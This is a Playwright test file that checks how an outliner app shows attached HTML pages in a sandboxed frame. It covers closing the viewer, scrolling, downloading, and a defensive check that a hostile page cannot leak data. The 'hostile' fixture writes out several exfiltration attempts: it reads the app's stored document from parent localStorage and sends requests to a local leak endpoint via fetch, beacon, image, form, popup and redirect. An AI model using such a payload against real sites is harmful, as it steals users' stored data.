import { Page, PlaywrightWorkerArgs, TestInfo, test as base, expect } from "@playwright/test";
import { createHash } from "node:crypto";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { freshOutline } from "./helpers";

const test = base.extend({
  page: async ({ page, browserName, playwright }, use, testInfo) => {
    if (browserName !== "webkit") return use(page);
    await withWebKitPageThatKeepsBlobs(playwright, testInfo, use);
  },
});

async function withWebKitPageThatKeepsBlobs(playwright: PlaywrightWorkerArgs["playwright"], testInfo: TestInfo, use: (page: Page) => Promise<void>): Promise<void> {
  const profile = mkdtempSync(join(tmpdir(), "outliner-webkit-"));
  const { baseURL, viewport, userAgent, deviceScaleFactor } = testInfo.project.use;
  const context = await playwright.webkit.launchPersistentContext(profile, { baseURL, viewport, userAgent, deviceScaleFactor });
  try {
    await use(context.pages()[0] ?? (await context.newPage()));
  } finally {
    await context.close();
    rmSync(profile, { recursive: true, force: true });
  }
}

const LEAK = "http://127.0.0.1:5189/leak";

const pages = {
  word: `<body><script>document.body.append("drawn by its script")</script></body>`,
  heading: `<body><a href="#end">to the end</a><div style="height: 4000px"></div><h2 id="end">The end</h2></body>`,
  hostile: `<head><meta http-equiv="refresh" content="1;url=${LEAK}?refresh"></head><body>
    <form id="post" method="post" action="${LEAK}?form"><input name="x" value="1"></form>
    <a id="away" href="${LEAK}?link">away</a>
    <script>
      const tries = [
        () => parent.localStorage.getItem("outliner-lab:doc:v1"),
        () => localStorage.setItem("leak", "1"),
        () => fetch("${LEAK}?fetch").catch(() => {}),
        () => (new Image().src = "${LEAK}?image"),
        () => navigator.sendBeacon("${LEAK}?beacon", "x"),
        () => open("${LEAK}?popup"),
        () => document.getElementById("away").click(),
        () => document.getElementById("post").submit(),
      ];
      for (const attempt of tries) try { attempt(); } catch {}
      document.body.append("tried");
      setTimeout(() => (location.href = "${LEAK}?address"), 300);
    </script></body>`,
};

type PageName = keyof typeof pages;

const hashOf = (name: PageName) => createHash("sha256").update(pages[name]).digest("hex");
const childOf = (name: PageName) => `[${name}.html](att:${hashOf(name)})`;
const frame = (page: Page) => page.frameLocator(".viewer-frame");

async function openWithPages(page: Page, outline: string): Promise<void> {
  await freshOutline(page, outline);
  await page.evaluate(async (files) => {
    const database = await new Promise<IDBDatabase>((resolve, reject) => {
      const request = indexedDB.open("outliner-lab-files", 1);
      request.onupgradeneeded = () => request.result.createObjectStore("files", { keyPath: "hash" });
      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
    const store = database.transaction("files", "readwrite").objectStore("files");
    for (const [hash, html] of files) store.put({ hash, type: "application/octet-stream", blob: new Blob([html], { type: "application/octet-stream" }), uploaded: true });
    await new Promise((resolve, reject) => {
      store.transaction.oncomplete = resolve;
      store.transaction.onabort = () => reject(store.transaction.error);
    });
    database.close();
  }, (Object.keys(pages) as PageName[]).map((name) => [hashOf(name), pages[name]]));
}

async function openPage(page: Page, name: PageName): Promise<void> {
  await openWithPages(page, `report\n  ${childOf(name)}`);
  await page.locator(".item.attachment .att-label").click();
  await expect(page.locator(".viewer-frame")).toBeVisible();
}

test.describe("an attached html page", { tag: "@keys" }, () => {
  test("opens in a frame sandboxed to scripts alone, with Close focused", async ({ page }) => {
    await openPage(page, "word");
    await expect(page.locator(".viewer-frame")).toHaveAttribute("sandbox", "allow-scripts");
    await expect(page.locator(".viewer-name")).toHaveText("word.html");
    await expect(page.locator(".viewer-close")).toBeFocused();
  });

  test("shows what its own script writes", async ({ page }) => {
    await openPage(page, "word");
    await expect(frame(page).locator("body")).toHaveText("drawn by its script");
  });

  for (const [way, close] of [
    ["the Close button", (page: Page) => page.locator(".viewer-close").click()],
    ["Escape in the app", (page: Page) => page.keyboard.press("Escape")],
    ["Escape in the page", async (page: Page) => {
      await frame(page).locator("body").click();
      await page.keyboard.press("Escape");
    }],
    ["Back", (page: Page) => page.goBack()],
  ] as const) {
    test(`closes on ${way} and keeps the address`, async ({ page }) => {
      await openPage(page, "word");
      await expect(frame(page).locator("body")).toHaveText("drawn by its script");
      const address = page.url();
      await close(page);
      await expect(page.locator(".viewer")).toHaveCount(0);
      expect(page.url()).toBe(address);
      await expect(page.locator(".item.attachment")).toBeVisible();
    });
  }

  test("a hostile page sends nothing out and leaves the app in place", async ({ page }) => {
    const leaks: string[] = [];
    await page.context().route(`${LEAK}**`, (route) => {
      leaks.push(route.request().url());
      return route.fulfill({ body: "" });
    });
    await openPage(page, "hostile");
    const address = page.url();
    await expect(frame(page).locator("body")).toContainText("tried");
    await page.waitForTimeout(2000);
    expect(leaks).toEqual([]);
    expect(page.url()).toBe(address);
    await expect(page.locator(".viewer-frame")).toBeVisible();
    expect(await page.evaluate(() => localStorage.getItem("leak"))).toBeNull();
  });

  test("a link to a heading scrolls the page to it", async ({ page }) => {
    await openPage(page, "heading");
    await expect(frame(page).locator("#end")).not.toBeInViewport();
    await frame(page).locator("a").click();
    await expect(frame(page).locator("#end")).toBeInViewport();
  });

  test("Download saves the attached file unchanged", async ({ page }) => {
    await openPage(page, "word");
    const download = page.waitForEvent("download");
    await page.locator(".viewer-download").click();
    expect((await download).suggestedFilename()).toBe("word.html");
    expect(readFileSync(await (await download).path()).toString()).toBe(pages.word);
  });

  test("a link to it written in a note downloads it and opens no viewer", async ({ page }) => {
    await openWithPages(page, `report | see ${childOf("word")}`);
    const download = page.waitForEvent("download");
    await page.locator(".note .att-label").click();
    expect((await download).suggestedFilename()).toBe("word.html");
    await expect(page.locator(".viewer")).toHaveCount(0);
  });
});
